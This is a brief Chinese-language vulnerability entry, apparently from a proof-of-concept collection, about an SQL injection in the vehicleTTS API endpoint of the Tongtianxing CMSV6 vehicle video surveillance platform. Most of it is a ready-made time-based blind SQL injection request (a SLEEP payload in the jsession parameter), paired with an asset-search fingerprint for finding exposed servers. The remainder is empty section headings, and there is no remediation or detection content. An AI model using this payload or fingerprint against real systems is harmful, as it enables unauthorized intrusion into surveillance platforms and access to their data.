# 通天星CMSV6车载视频监控平台StandardApiAction_vehicleTTS存在SQL注入漏洞

- **系统**：通天星CMSV6车载视频监控平台　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`web.body="./open/webApi.html"`
- **请求**：`GET /StandardApiAction_vehicleTTS.action?DevIDNO=1&Text=x&jsession=2C0EB587191F68C441F128919862AC11%27%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(3)))DpjE)--%20gtMe HTTP/1.1`
- **关键头**：`Cookie: JSESSIONID=8D45F4B70B77ED88CCD43B3050A2934F`

**请求体 / payload**
```
/StandardApiAction_vehicleTTS.action?DevIDNO=1&Text=x&jsession=2C0EB587191F68C441F128919862AC11
```

**其他**
- 通天星CMSV6车载视频监控平台 StandardApiAction\_vehicleTTS存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 通天星CMSV6车载视频监控平台